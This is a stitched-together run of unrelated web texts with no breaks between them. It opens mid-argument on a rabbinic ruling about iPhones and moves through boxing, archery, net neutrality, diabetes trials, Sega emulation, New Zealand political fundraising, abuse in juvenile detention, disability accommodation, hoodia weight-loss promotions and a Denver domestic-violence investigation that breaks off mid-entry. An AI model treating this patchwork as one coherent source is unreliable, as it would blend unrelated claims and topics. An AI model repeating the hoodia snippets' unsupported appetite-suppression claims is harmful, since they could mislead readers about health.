The well-meaning Rabbi who runs the organization got carried away and did not understand that Rav Chaim was merely giving him encouragement to continue his work but did not actually mean that the iPhone owners are genuinely pasul l'Eidus. Rav Chaim himself allowed the quote to be made as a type of warning as to how serious we must view this new challenge to Judaism, but he did not actually rule that the iPhone owners are genuinely pasul l'Eidus. The well-meaning Rabbi who runs the organization perhaps misrepresented to Rav Chaim what an iPhone device actually is and how the majority of people actually use it. This author is incorrect and Rav Chaim actually ruled this way with all the associated repercussions and consequences and fully understood the nature and use of the iPhone.
It is unfortunate, but this author is aware of numerous instances where the first and third scenario has been replayed many times with Gedolim. Indeed, many Gedolim have issued the clarification that they only issue their rulings based upon the facts at hand that are presented to them.
It is highly likely that one of the first three scenarios is correct rather than the fourth, for numerous reasons – many of them halachic.
In the past few days this author has left numerous messages with the organization to ask a number of questions with no response. An attempt has been made to verify the ruling with Rav Chaim Kanievsky. Our source has told us that Rav Chaim did not out and out forbid these things, rather he stated that it may be a potential problem. This indicates that the first possibility is the most likely scenario.
Regardless, what is necessary, indeed crucial, is that the organizations should not be permitted to run wild issuing statements and letters where the Posaik did not actually sign such a ruling – particularly when the devastation and repercussions would be so widespread.
Why is it so crucial?
Because most people, unfortunately, are unaware of Rav Chaim's vast ouevre of halachic writing and are ignorant of the depth of his Torah knowledge and greatness. Seeing such statements time after time have a cumulative effect on people and takes away whatever emunas chachomim they have left. Our Torah leaders are the eyes and ears of the generation, and releasing statements and quotes said out of context or in response to a perhaps erroneous presentation of things only serves to undermine the respect we have toward Gedolei Torah.

Las Vegas- This month the new WBA rankings came out it debuted the former two-time/ two division world champion Carl Frampton (23-1-14KO) at number 2 in the Super-Featherweight division.
WBA #1 contender Bryan Vasquez (35-2-19KO) from Costa Rica said he is “Ready, willing and able to meet Carl Frampton this summer in Belfast Ireland at Windsor Park in either July or August.”
Vasquez “Let's make this fight happen Frampton” stated two-time WBA world champion and WBA #1 contender. “We are the two highest ranking contenders by the WBA at 130lbs. We both want a shot at the current champion (Jezreel Corrales) who will be defending his title in July against a guy with a dozen losses. Let's make this fight happen in Ireland!”
Bryan Vasquez is a two-time “Interim' WBA World Champion has faced the likes of Javier Fortuna, Sergio Thompson, Jose Felix Jr and Takashi Uchiyama.
A Vasquez vs. Frampton is a very intriguing matchup, Vasquez will have the size and maybe power advantage over Frampton having fought as high as Lightweight, while Frampton who started his career at Super-Bantamweight will have the speed advantage over Vasquez.
If Cyclone Promotions and Team Frampton are looking for a dance partner I'm sure the Costa Rican native will have no problem obliging them in a fight that could possibly be a WBA “Eliminator' with the winner earning the mandatory position and challenge for the WBA Championship next later this year.
At first glance, me spending my day off trying archery isn't related to my IRONMAN. But in truth it really, really is. Part of motivating myself to finish the IM is having something to be excited about after it's done. One of the things that I've been thinking would be cool is archery. I have a friend who is an archery coach and he and his equally fabulous partner, who is also into archery (it's how they met!) offered to teach Julianne and me. So today we decided to give it a shot (see what I did there…)
We started with equipment – recurve bow and three arrows, arm guard, finger sling, and finger tab (not gonna lie, some of these names made me giggle – I'm not proud of it, but there it is,) shooting from 18 meters.
My dreams of being a prodigy who hits a bullseye on her first try were quickly dashed when my first arrow hit the concrete wall what seemed like 12 feet above the target and then came crashing down to the floor. Spectacular.
This arrow took the nope train to Nopeville.
Second arrow way above the target but in the foam stuff so at least I got to hear the much more satisfying “thunk” sound. Third arrow directly to the floor because I'm nothing if not an over-corrector. Not exactly the Mozart of archery here.
Fourth arrow hit paper and I did the Larry and Balki dance of joy.
Thirty minutes later I shot all three arrows in the colored part of the target. Woot!
That's a bit better…
Shot for another hour, and started to get a better feel for it. At this point I can tell where the arrow is going to land when it leaves the bow, but I'm not yet sure exactly why, so I can't leverage that knowledge to improve the outcome. No bullseyes yet, but I remain hopeful.
Super cool thing: Almost everything that you learn for ballroom dance applies to archery – keeping tone in your arm against the pressure of the bow but being relaxed through the fingers (I often kept too much tension in my fingers as a dancer – BEWARE THE CLAW HAND – so I'm excited to get to work on this some more,) working from your core and lats instead of pushing and pulling with your arms and shoulders, keeping your body (especially upper body) stable through movement or application of force all apply here – so thanks to my dance coach Rowdy for helping prepare me for this!
Julianne did awesome! She sometimes uses a scooter and we learned that she can shoot from it, so now we know that during the zombie apocalypse we can get her a bow and a quiver of arrows and she can scoot around and kick some ass.
For those interested in scooter archery, we learned later in the session that it worked better for her to put her scooter parallel to the target wall (and not perpendicular as it is here) so that she didn't have to lean out and she could shoot from the most stable position.
It was a blast, it's something that I think I can be good at and enjoy doing, and I can't wait to shoot again! It makes me even more motivated to finish off this IM and have all this time to do fun new stuff.
Huge thanks to Tracy for the coaching, his partner Terry for shooting so that I could see it done by a woman – including showing me how to make it work without somehow removing a breast, and for all of her photography!
Speaking of photography, here are more pictures of our archery day:
Senator Al Franken (D-Minn.) has written to newly appointed FCC Commissioner Ajit Pai in defense of net neutrality, vowing to “fight to protect it every step of the way.”
Pai has publicly opposed net neutrality as championed by former Chairman Tom Wheeler since before the Open Internet order was put in place — and afterwards, published a 67-page critique of its implementation. He seems unlikely to be swayed, so this is really more gauntlet than letter that Senator Franken has sent his way.
The senator wrote:
As Chairman, you have an obligation to protect Americans' access to diverse information sources and to ensure that the internet remains a tool for American innovation, economic growth, and public discourse. I have no doubt that you recognize the significance of your new role, but your stated opposition to strong net neutrality rules raises serious concerns about your commitment to honoring the First Amendment.
Whatever course Pai and his colleagues on the commission choose to pursue, it won't be a quick reversal. Wheeler's order can't just be rescinded overnight; action to replace it must be proposed, debated and publicly commented on. The original order drew some 4 million comments, mostly positive (as Franken points out), and a replacement would likely draw a similar level of attention.
The FCC has a meeting tomorrow, but net neutrality and other serious issues may not even be brought up: the agenda is full of ordinary business like TV station licensing. But anything is possible these days, and we'll be watching; it'll be streamed live from the FCC's website starting at 10:30 AM Eastern.
The prognosis for patients with diabetes has steadily improved in recent decades, thanks to technological advances like self-monitoring meters, new insulins and increasingly smaller, portable insulin pumps. But when Edmoth Matthews of Sterling, Mass. was first diagnosed with type 1 diabetes as a child, he was advised by medical experts to set aside any expectations to live a normal, active life. “I was told I'd see a cure by my 18th birthday,” recalls Mr. Matthews, now in his 40s, “but that until then, I should stay home and take it easy — and just forget about being a firefighter.”
“By giving people with diabetes tighter control of their blood sugar, the artificial pancreas increases the likelihood that we'll live longer, healthier lives — and that's everything to me.”
In the years since his diagnosis, the veteran firefighter for the city of Marlborough, Mass., has defied the limitations supposedly set out for him by his condition. But it hasn't been easy. Managing his care means constantly calculating what he calls ‘the triangle': the delicate relationship between food intake, exercise and medications.
But Mr. Matthews has never given up hoping for a better way — and it's this hope that drew him to Mass General 's human clinical trials for the artificial pancreas system. “If this device works, I might finally get a chance at a normal lifestyle,” he says.
Stanley Baker, a 72-year-old retired financial manager from Ipswich, Mass., who was diagnosed with type 1 diabetes 25 years ago, couldn't agree more.
“Diabetes is top of my mind at all times for me,” says Mr. Baker, “and even with the best medical care available, you're essentially on your own in the world with the disease. It can be a scary thing.” Mr. Baker has also volunteered to participate in the artificial pancreas trial. For him, the trial offers a twofold advantage — a chance to benefit the diabetes community and an opportunity to learn more about his disorder.
“The medical team and the researchers have already taught me so much about how my body works, how it responds to different situations,” says Mr. Baker. “By giving people with diabetes tighter control of their blood sugar, the artificial pancreas increases the likelihood that we'll live longer, healthier lives — and that's everything to me.”
Construction on Edmonton's Jasper Avenue remains far behind schedule, but there are questions over how quickly crews are getting the job done.
City councillors were assured by PCL Construction was redoubling efforts to complete the work by running two shifts with the second working to midnight six days a week.
However CBC News video taken on Jasper Avenue every evening last week well before midnight showed no workers in sight.
"It's a little baffling," said Coun. Kerry Diotte after watching the video. "We've got to push hard and make sure this thing gets done very quickly."
Paul Szczepanski, Edmonton's director of arterial roads, told CBC News the workers are trying not to disturb nearby hotel guests and people who live in downtown apartments.
"We don't want to be disrupting those folks' sleep," he said.
Business owners have long complained about the construction on the city's main downtown street saying it's hurting their bottom line. At least one retailer asked council for a break on his taxes in compensation for his losses but was denied.
Alon (aka Mr.Cynic)
Ok...billypligrim - I think this IS a conflict of definitions. I would not classify the hope one gets instinctively as faith. I agree that love is often dependant on hope but I don't think 'a leap of faith' must be made to go for what your feelings tell you - especially if you feel love because you have spent a great deal of time with someone and slowly fallen with love with them, as you have got to know them. The main disagreement I have with you is what the word 'faith' means. I understand it to be belief without a need for logic or evidence. I also feel that when one says someone has 'faith' their beliefs are pretty set and they would be reluctant to change them.
If you define faith as hope then maybe it is what defines our humanity. But maybe it is the diversity of will that defines our humanity? Or maybe they both do .
Again - I say faith interferes with the truth, but not if faith is hope. If faith is what I interpreted to be above, I stick to that statement.
I don't believe strongly but am unsure of other powers. I don't think I can state that there are such invisible powers at the moment.
As I said in an earlier post, "I won't agree that all atheists make this leap'O'faith". Yes - maybe many atheists made a leap of faith from belief/agnosticism. But not all do. I don't think it's right to say that all atheists do nor is it correct that all atheists have faith in their beliefs.
Now, The Mummy - I did not say I have no "respect for people who do believe". I said (about believers) "Unfortunately I do not respect their beliefs much. I can't do much about it". I did not say that I hold little respect for those who do believe but that I have found no way to respect their views. I've talked to a few more zenful than I (well actually, most people are ) but billypilgrim is one. She respects all beliefs. I don't. Maybe I will eventually but I have found no way to at the moment.
GB, I would not call an assumption based on logic that you dare do doubt "faith". I disagree that assumption is another word for "leap of faith". I also don't think that faith is simply "a strong conviction".
The belief that the Earth was flat was a very good assumption. The earth looked pretty flat and they had no way to prove otherwise. BUT, they had faith in their assumption. Those who stated contrary to popular belief were branded heretics.
"Similarly, atheists believe there is no god, and (most) do not question it." - maybe most atheists do not question it and maybe then they can be said to be faithful. But I do question it. I try and test my beliefs. I still believe them but I dare to put doubt against them. I'm not agnostic though as I still believe strongly but allow for change.
I don't expect information to come along and prove there is an almighty deity. But I do make sure that just because I don't expect it I shouldn't be unwilling to accept it. If there is a God and he gets pretty pissed off by those that didn't believe in him/her, I should definitely be one that goes off to eternal damnation . I have no faith in what will happen once I am dead and finally, I hope that the origin of life was entirely natural but I don't have faith that it was.

Lego looter at large after $8,500 heist in regional NSW
Updated
Police are hunting for a Lego looter in regional New South Wales, and the perpetrator is sure to be bricking it.
About $8,500 worth of the popular plastic building blocks were stolen from a toy store in Young, in the state's south-west slopes.
Police have begun piecing things together, and today released CCTV footage of a man they believe can assist with inquiries.
They said an unknown offender forced entry to the shop on Boorowa Street about 3.30am on April 17.
They believe the Lego-loving assailant fled the scene in a vehicle.
Detective Inspector Scott Wilkinson said the items were desirable and expensive.
The stolen boxed sets are believed to be worth between $150 and $550 each.
"It's highly likely that they could be on-sold online, I'd be asking people to be highly suspicious of products that are being sold for cheaper-than-expected prices, and in particular if there's a large number of items being listed from the Young area we'd be very interested in finding out about that," he said.
"To tell the truth, this is the first time I've had any experience with Lego being stolen, but I know it is highly desirable and it is expensive, so there is probably a readymade market for items that are not quite as expensive as those bought legitimately."
'We're talking about people's livelihoods'
Detective Inspector Wilkinson said the theft was serious.
"While we are talking about toys, and we're talking about Lego, the total value of this property is around $8,500," he said.
"We're talking about people's livelihoods here, the success of this business, whether it continues or fails, could well depend on that sum of money."
The store's owner said he was glad the police were looking into it.

The concept behind Sega Forever is a good one: bring a selection of classic Sega games to iOS and Android, and let people play them for free. Unfortunately, the execution has left something to be desired. Following the launch of Sega Forever last week, players have taken to the App Store and Google Play to complain about choppy frame rates, out-of-sync audio, and input lag, even on high-end devices like the Samsung Galaxy S8 and Google Pixel. Ars' own testing yielded similarly poor results, with none of the games reaching the required 60FPS of the original Megadrive (Genesis) hardware.
Sega's performance issues stem from the use of a new emulator based in Unity. Older mobile versions of retro Sega games were either direct ports—as in the case of Sonic the Hedgehog and Sonic CD—or used a native emulator, instead of one passed through Unity. Players that already paid for one of the launch games—Sonic the Hedgehog, Phantasy Star II, Comix Zone, Kid Chameleon, and Altered Beast—also suffered from issues, including the inability to remove advertisements from the game.
Speaking to Eurogamer, Sega Networks' chief marketing officer Mike Evans blamed "fragmentation" for the wobbly launch, and defended its use of Unity instead of an alternative emulation method.
"Within mobile there's a lot of fragmentation," said Evans. "If you look at all the different OSs, all the different devices—with mobile, as you go live, you get some feedback which you can't get within a sandbox environment. What we're doing is taking that and continue working on it, and try and get every instance of every OS in advance...we've got some really good updates coming out soon which will address some of the challenges of the d-pad, some of the shading as well that we're looking at how to improve. It's just the start of things."
"What we wanted to do is bring these games to the largest audience possible, and that's one of the things that mobile does—many people, especially in developing countries, don't have access to high-end PCs or Macs or other things, so mobile's the sole way they engage with it, continued Evans. "We looked at a number of different things, and what we decided was Unity allowed us that broadness and we could piggyback a lot of the updates as well. It enables us to broaden it...it opens up other commercial opportunities for us with Apple TVs, desktops and the Switch as well."
Following the launch of Sega Forever, the developers behind RetroArch—a popular emulator based on the Libretro API—took to Twitter to denounce Sega's use of Unity. While there's a certain note of sour grapes behind the tweets, RetroArch famously features excellent emulation.
"Sorry to all the people that are experiencing subpar performance with this Unity thing," the RetroArch devs tweeted. "They could have been using RetroArch right now if they hadn't been so stubbornly insistent on demanding we relicense our entire program to something that would strip us of all our rights, on top of some other unreasonable things like not showing any branding, etc. Hell, they could have had this running on the desktop right now on top of consoles and maybe some netplay as well. Oh well..."
Evans also responded to RetroArch via Eurogamer, saying: "One of the developers we're using, a company called GoGames, they'd been in talks with Libretro on the RetroArch emulator. That particular emulator is under a GPL, a general public licence. From a Sega perspective, we can't bundle GPL software with Sega proprietary games, because we lose certain rights within the games—it's a corporate policy for us. That said, where we are with the Genesis and the Mega Drive we have a proprietary emulator that was used on the DS and Steam as well, and we've spent a lot of time working on that until the quality is solid as well."

That the emulation in Sega Forever is poor is odd given the great lengths Sega has gone to in recent years to improve its retro games. Its work with M2 on the Sega Classics series for 3DS is widely regarded as excellent, while the Steam-based Mega Drive Classics and accompanying mod support have been warmly received by the PC community.
Christian Whitehead, the fangame developer behind the excellent mobile ports of Sonic has also since moved in-house at Sega, developing the upcoming Sonic Mania for Xbox One, PlayStation 4, and Nintendo Switch.
Some of Wellington's most recognisable names paid $3500 each to meet Prime Minister John Key at a National Party fundraising dinner also attended by his taxpayer-funded chief of staff, Wayne Eagleson.
As Opposition allegations continue to swirl around National's so-called "Cabinet clubs" for wealthy donors, it has emerged about 15 people, including former Wellington mayor Kerry Prendergast and Weta Digital co-founder Jamie Selkirk, attended the dinner at the Museum Hotel, which raised $45,000 for National.
The Cabinet club fundraising events, attended by leading National MPs, have been in the spotlight this week after the resignation of Maurice Williamson, who intervened with police on behalf of a wealthy National Party donor.
Justice Minister Judith Collins has also been under attack over her dinner with representatives of milk exporter Oravida - a company her husband governs, and which has also donated to National.
The fundraisers have been criticised for providing donors with access to ministers in return for cash. National has responded that Labour has done the same kind of fundraising.
The Museum Hotel event was held in 2011, and organised by hotel owner and National Party fundraiser Chris Parkin.
He said yesterday the event was nothing to do with the Cabinet clubs but was his way of helping to support National.
He joked that at least $2000 worth of each donation was for the food and wine. He did not believe anyone attending fundraising dinners expected to be able to "influence" the prime minister. "They are more there to ask questions."
Developer Richard Burrell, who was one of those present, said he was "chuffed" to attend after the asking price dropped from $5000 to $3500, and because Parkin always put on entertaining events that were good fun.
Key and Eagleson chatted to those attending, and it was "a good fun evening".
Payment for the event went to Parkin, he said. Official party donation records show Parkin correctly declared a $45,000 donation to National about two months later.
Prendergast said yesterday that she did not pay to attend, as she was there as a guest of Parkin. Selkirk did not want to comment.
Green Party leader Russel Norman said the fundraiser showed wealthy people could get access to the prime minister when poorer people could not.
Such fundraisers "may be technically legal, they're not right", he said. "If you have a lot of money, you can buy exclusive access to the prime minister."
Having his chief of staff with him was "proof" that Key was there in his official capacity, Norman said. "He was using the office of the prime minister to fundraise for the National Party. That is wrong."
A spokeswoman for Key said the Greens were welcome to highlight legitimate fundraisers by National, but Key was more interested in the job of governing.
National had frequently pointed out that all the funds it raised were declared as required by law. She did not respond to a question asking if it was Key's usual practice to take Eagleson to fundraisers.
Otago law professor Andrew Geddis said National had obeyed the rules around donations by declaring the aggregate of those who donated.
People who donated to political parties liked to see where their money was going and to have contact with those they were giving money to, he said.
Thirty-two teens escaped from a Tennessee juvenile detention center late Monday night, taking advantage of an overnight shift change to leave the building before slipping underneath a chain-link fence to freedom. By the next evening, all but seven had either been caught by police or turned themselves in. “Was [the escape] a fluke? Was that planned? We don't know yet,” said Rob Johnson, a spokesman for the state's Department of Children's Services. It wasn't the first time that teens at the Woodland Hills Youth Development Center made a break for it. In May, a half-dozen escaped their bedrooms early one morning and made it to the facility's outdoor courtyard before being convinced by staff to return to their rooms.
It's too soon to speculate about what motivated the kids to escape. But while we await details, now is the perfect time to recount the troubling history of staff sexually abusing children in facilities like Woodland Hills. That's not to suggest that misconduct is what motivated the kids to flee—we don't know if it even played a role. Woodland Hills does, though, have a well-documented record of alleged sexual misconduct. This sort of abuse happens outside the country's field of vision, behind fences and closed doors, where authorities can too easily brush aside allegations from troubled youth. That's all the more reason to give the abuse a fuller accounting whenever news from a facility like Woodland Hills spills over (or in this case, under) its walls.
So, what has been going on at Woodland Hills? A 2010 investigation by
the Tennessean found a series of allegations that had gone largely uninvestigated and unpunished by authorities. One of the facilities' kitchen employees, the newspaper discovered, had reportedly given a 17-year-old boy chlamydia, and later lived with a different male juvenile who she had been accused of abusing while he was in the facility. The woman was cleared in four separate state investigations despite failing a lie detector test. She was ultimately convicted only after she turned herself in to police. In another case uncovered by the paper, a different female guard went on to marry a former inmate after he was released from the facility. The woman kept her job even after her marriage came to light.
Such incidents are sadly common inside our juvenile justice system. In the most recent federal survey of detained juveniles, nearly 8% of respondents reported being sexually victimized by a staff member at least once in the previous 12 months. For those who reported being abused, two things proved overwhelmingly true, as they were in Woodland Hills: They were teenage boys, and their alleged assailants were female employees tasked with looking out for their well-being. Nine in 10 of those who reported being victimized were males reporting incidents with female staff. Women, meanwhile, typically make up less than half of a juvenile facility's staff.
These were not one-time occurrences. Among those who said they were abused by staff, 86% reported more than one incident in the previous year; 20% of those who reported sexual misconduct said it happened at least 11 times over that period. According to the Bureau of Justice Statistics survey, the use or threat of force was present in only one in five victims. Instead, the research suggests that female guards are more likely to establish a relationship with the boys, writing them letters, giving them gifts of alcohol or even drugs, or granting them special favors to build their trust. Such activity—often called “grooming”—not only sets the stage for the abuse that follows but also makes the teens less likely to report their abusers after the victimization happens—or even to consider it abuse in the first place. Consider, nearly one in five of the victimized youth reported that they “always” made the first move, while an additional 46% said they “sometimes” did. Even if the teens are of age—and at least some were likely over the age of consent—that changes nothing: No one being kept in custody can consent to having sex, regardless of their age or gender.
Sadly, again and again, we still have corrections officials talking about manipulative youth
The Justice Department first documented the surprising prevalence of female staff sexual abusing male juveniles in 2010 after surveying a limited sample of detention centers and group homes. Three years later the DOJ released a second report with a broader sample, finding the same trend. While there is cautious hope that the problem will be addressed through policy changes required by the Prison Rape Elimination Act—which bans guards of the opposite gender from performing body searches or otherwise being present when a juvenile is undressed, among other things—the issue remains largely off the nation's radar, popping up on those rare occasions when a parent of a victim contacts the press, but then quickly receding back into the darkness that so often envelops our justice system.
In that regard it is not unlike what happens in the nation's adult prisons, where routine sexual assault among inmates is often unfairly brushed aside as simply part of the punishment. For the young males in juvenile homes, that it-happens-but-what-can-you-do-about-it attitude comes with a twist: It's the boys who are being abused who often receive much of the blame. In an interview with ProPublica last summer, Reggie Wilkinson, a former director of the Ohio Department of Rehabilitation and Correction, conceded there is no such thing as consensual sex in a detention center. He followed that by saying, “[T]he reality of it is that some of the guys in prison are very persuasive and some of the women are very persuasive.”
“Sadly, again and again, we still have corrections officials talking about manipulative youth,” says Lovisa Stannow, the executive director of Just Detention International, a human rights organization dedicated to ending sexual abuse in prisons and jails. “Stop and think about that: We're talking about troubled kids who need help turning around their lives. This is not rocket science: If you are a corrections officer, you need to abide by the law.”
The attitude that these boys bear some blame, however small, is dangerous in a vacuum. It's downright reckless when we know that 90% of reported incidents involve male juveniles and female guards. “That minimizing of a serious crime is really contributing to the crisis,” says Stannow, “and we are talking about a crisis here.”
“Disability accommodation.”
Say it. What do you think of when you read and say those words?
Opportunity?
Investment?
Increased workplace morale?
If not, your attitude toward disability accommodations could be costing your organization valuable money. Here are the three ways your attitude about disability accommodations is preventing your organization from reaching its maximum potential.
#1: You equate “disability accommodation” with dollar signs . . . and not in a good way.
Unfortunately, this reaction is all too common among managers and HR professionals, but it's completely unjustified. According to a study conducted by the U.S. Department of Labor's Job Accommodation Network (JAN), 59% of employers who make accommodations for disabled employees spend absolutely nothing to provide the accommodations. The other 41% of employers reported spending about $500 per accommodation.
Most organizations wouldn't balk at the idea of spending $500 to train an employee to learn a new software program or attend an industry professional conference. Why, then, do so many employers regard disability accommodations as losses rather than opportunities for investment?
Instead of focusing on how the upfront cost of the accommodation will affect your organization's bottom line this quarter, think of the accommodation as an investment in your company's long-term human capital. The same JAN study that revealed most accommodations are inexpensive also found that 63% of employers who provided disability accommodations reported an “increased overall company morale”.
Providing reasonable accommodations to employees living with disabilities gives employers a wonderful opportunity to show their humanity while investing in the organization. The employees receiving the reasonable accommodations, along with their non-disabled co-workers, are more likely to view their employers as human beings and not as corporate drones.
#2: We can't provide the equipment/ leave/ schedule the employee requested as a disability accommodation, so there's nothing we can do, right?
Not so fast! Even if the cost of providing accommodation is more than a few hundred dollars, the Americans with Disabilities Act of 1990, as amended, requires most employers to provide reasonable accommodations to disabled employees – unless providing the accommodation would result in an undue hardship for the employer.
How do you know if the accommodation will result in an undue hardship for your organization? According to the U. S. Equal Employment Opportunity Commission's (EEOC's) online guidance, “Undue hardship means that the accommodation would be too difficult or too expensive to provide, in light of the employer's size, financial resources, and the needs of the business.”
Even if your organization decides the requested accommodation is far more than what it can provide, it should still think about what it can do to accommodate the employee. The EEOC's online guidance emphasizes that employers do not have to provide the requested accommodation. If more than one accommodation is effective, then the employer can choose which accommodation to provide.
For example, let's say Juan is the Director of HR for a growing internet startup. One of the salespeople for his company, Tim, has been diagnosed with ADHD and an anxiety disorder. Tim's doctor has recommended that Tim work in silence and in a solitary place to help manage his ADHD symptoms. Tim meets with Juan and proposes constructing an elaborate soundproofed cubicle in one corner of the office's open design. The price is far more than what the company can afford.
Juan starts doing some research into the matter and proposes an alternative, yet effective and affordable, accommodation for Tim. Juan offers to provide Tim with noise canceling headphones and a workspace in a part of the office that is away from the visual distractions that bother Tim. These accommodations meet Tim's doctor's recommendations and are just as effective as the more expensive solutions suggested by Tim.
If you're having trouble figuring out what alternative accommodations might work for your employee, take a look at the Job Accommodation Network's (JAN) website. They have a plethora of resources to help your organization discover accommodation options for employees, and their services are completely free!
#3: There really isn't accommodation that will allow the employee to perform his/ her job. We really are done now, right?
Maybe. (Probably not.) Does your organization have any other open positions the employee could perform? If so, you need to offer those positions to the employee before any separation in employment. The disabled employee in need of an accommodation should not have to apply and/ or compete for these positions if he or she is qualified to perform the work.
Example: Angela works as a salesperson for a car dealership. When she's diagnosed with cancer, her car dealership provides her with accommodation of leave without pay. After 18 months of treatment, Angela's cancer is in remission, but her immune system is suppressed, and it prevents her from spending too much time in public places. After 18 months without Angela, the dealership really needs to fill her position.
Since Angela and her doctor are uncertain of when she will be able to return to work in a public environment, the car dealership fills Angela's sales position with a new employee, but it offers Angela its open position in the accounting department since Angela is qualified for the position.
Although the dealership anticipated hiring an accounting employee to work on-site at its office, it consults with its IT service and discovers that it can set up Angela's home office with some existing computer equipment and a monthly voucher for high-speed broadband service at an affordable rate.
Angela misses working in sales, but she also knows it's just not possible for her to work in a face-to-face sales environment right now. She's happy to work for an employer who provided her with extensive leave and an option to work from home. The car dealership also gets to keep a reliable employee who already understands its business. An added bonus is that Angela's co-workers get to see their employer treating Angela with humanity. Everyone benefits!
Even though it may not seem like it at first, disability accommodations are a great way to enhance your workplace culture and cultivate employee engagement. With a little practice and ingenuity, you can start to see workplace accommodations as a valuable tool for organizational growth.

The benefits of using hoodia in order to lose weight have gained more interest over the last few years. When compared to some of the health foods and dietary supplements currently being sold in drugstores, hoodia is generally more accepted and said to have more health benefits. The biggest plus that people turn to hoodia pills for is their ability to decrease your appetite, which means that you don't eat as much or even want to eat as much. This decrease in caloric intake thus leads to losing weight. Howe...
Here are some tips to finding the best weight supplements for you even if you do not fall under the obese category and just want to shed those extra kilos around your belly. Weight loss through diet supplements and not hardcore exercise or weight training is what every obese and overweight is looking for. Starving yourself to death for a day or two has never worked for anybody and it will not work for you either. The third day or the third week you tend to give in to the temptation of having a good elabora...
Parents, health books, and doctors all like to stress out how necessary it is to have good eating habits and a healthy lifestyle. Not everyone is after that idea because they like to eat the things that satisfy their cravings and get involved in activities that they find most enjoyable. But the point isn't really about abandoning these habits and shifting towards a solid set of rules. Forcing a change in habits like that is never good but setting some space aside for healthy eating and living is perhaps the...
The continuing uncertainty surrounding whether University of Miami coach Al Golden will stay in Coral Gables or leave for the opening at Penn State has already affected recruiting.
Hialeah Champagnat Catholic defensive tackle Travonte Valentine decommitted on Saturday after the U.S. Army All-American Bowl in San Antonio.
Valentine, a four-star player who had been one of Miami's 29 commits, named LSU his top choice.
"Since Miami ain't looking so good now, until further notice, I'm decommitting from Miami University because I'm not sure about Al Golden so far," Valentine said in an interview with The Times-Picayune (New Orleans).
"All of the commotion about Penn State and this and that right now. Al Golden is a great coach. He told me I was going to see things that I've never seen before. So for right now, I'm decommitting."
Earlier this week, Penn State reportedly put Golden on its wish list to replace Bill O'Brien, who took an NFL head-coaching job with the Houston Texans. On Friday, reports stated the Nittany Lions planned to interview Golden over the weekend in South Florida.
The Miami Herald heard back from UM athletic director James Blake, who said he has been in regular communication with Golden, on Saturday via text. He wrote: "He is our football coach and I believe he will be our coach going forward. Go Canes!"
Golden, 44, was a tight end for Penn State from 1989-1991 and a linebackers coach and recruiting coordinator for one season under Joe Paterno in 2000.
In three seasons with Miami, Golden has gone 22-15. He is under contract at UM until Jan. 31, 2020.
Neither the University of Miami nor Golden has released an official statement. Monday's press conference with Golden to wrap the 2013 season is still scheduled as of now.

This week's comic was inspired by the pool tournament we're having at work. I used to play a fair bit of pool back in Dubai about six or seven years ago, so much that I even bought my own cue stick. It looks awesome.
However, six or seven years later after not playing much pool at all, I've lost all my skill and replaced it with bad. It's pretty embarassing playing terribly with a fancy cue stick. Anyway, I lost the first round by sinking the black on my second go. Luckily I have one more match to prove myself, so wish me luck.
It has passed 5am here now, so I need to grab some sleep and energize myself for that pool match tomorrow, goodnight.

Leadership tussle 'could decide carbon tax'
A potential Labor leadership vote between Bill Shorten and Anthony Albanese could be a de facto party verdict on the carbon price repeal, according to a report in The Australian Financial Review.
The newspaper cites comments by Labor right faction MPs Richard Marles and Nick Champion yesterday who both said Labor should allow the repeal bill through the Senate.
Mr Shorten is a member of Labor's Victorian right while Mr Albanese is from the NSW left faction.
Mr Champion told the newspaper that Labor voters wouldn't like the carbon pricing scheme because "they don't like markets and they don't like the Greens".
"Emissions trading is a system designed by market economists to appease the green fundamentalists," he reportedly said.
But the two MPs received little support from elsewhere in the party. Michelle Rowland, who like Mr Champion survived a tight election battle, said the party had already been punished once for walking away from carbon pricing and that Direct Action was nonsense.
"I'm not voting for a policy magic trees and planting trees and magic soil," she said.
This morning senior Labor MP Mark Dreyfus said he understood Mr Champion's frustrations, but that Australia's emissions trading scheme was world's best practice.
"Of course we didn't win the election," he told Sky News.
"But it's been clear policy and it is the right policy for Australia and I'm going to work to defend it and Labor is going to work to defend the right policy for Australia.
"I've got a mandate to defend good policy.
"I was elected to the Australian parliament on the clearest possible platform and that is for an emissions trading scheme."
The Labor leadership battle could potentially continue for a month as recent reforms under former prime minister Kevin Rudd require the vote of rank and file members as well as caucus.

DENVER -- In less than two years, more than 40 people have lost their lives in domestic violence murders in Colorado.
Reports indicate at least 43 children lost parents in the string of killings.
And in at least nine of those incidents (at least seven in 2016 alone) the suspected murderer also took his own life.
Denver7 Investigates obtained police records and read through press reports in several of those incidents to look for common threads and red flags leading to murder, suicide, and devastation.
January 6, 2016 – Littleton
Victim: Christa Benton
Suspect: David Fallon
Murder weapon: Gun
History: Police called five prior times to apartment, no arrests for domestic violence
Christa Benton's teenage son called 911 around 2 a.m. asking for an ambulance for his mother, who he said was injured in a fight with her boyfriend, David Fallon.
A Denver7 investigation showed police officers spent less than 30 minutes in the apartment and left without arresting Fallon. Benton got a ride to the emergency room where she was diagnosed with a neck injury linked to a domestic assault.
When Benton arrived home from picking up pain medication for her injury, police say Fallon shot her then shot himself. She survived long enough to call 911 for help but died at the hospital a short time later.
The couple's 14-year-old son, Jonathan, is being raised by his grandmother. He told Denver7 he misses both of his parents every day.
“She was just really smart and outgoing. Really nice. Super nice. She always was there for you. Like, you have a bad day at school … You could go to her and talk to her about it,” Jonathan Fallon said of his mother.
“My dad used to be a really good person. He used to always take care of his parents. He always used to take care of me. He'd always be like the person you went to if you needed something, just like my mom was. He used to be a really great guy, a great dad. I think just some bad things happened to him,” Jonathan said.
February 27, 2016 – Commerce City
Victim: Monica Montoya
Suspect: Luis Lara
Murder weapon: Gun
History: At least 2 prior calls to address, no arrests
A woman told police her daughter, Monica Montoya, arrived at the Commerce City home she shared with her husband, Luis Lara, shortly after her husband punched her several times during an argument.
The mother told police she heard a gunshot after Montoya arrived and found her daughter grasping at her chest. She saw Lara pointing a gun and said, “What did you do?” Police said Lara shot his stepdaughter then turned the gun on himself.
Neighbors told officers the couple split and reunited several times in the years and months leading up to the murder-suicide. Neighbors said Lara packed many of his belongings and loaded them into a U-Haul about a month before the incident, telling neighbors he planned to move to Texas. He described his wife's daughters to neighbors as “troublesome.”
Police said they investigated two prior incidents at the apartment but did not make any arrests.
Monica Montoya left behind three young children. The community donated more than $50,000 toward her triplets' education funds in the wake of her murder.
April 30, 2016 – Loveland
Victim: Jessie Powell Haley
Suspect: Jared Haley
Murder weapon: Gun
History: At least 5 prior calls to the address
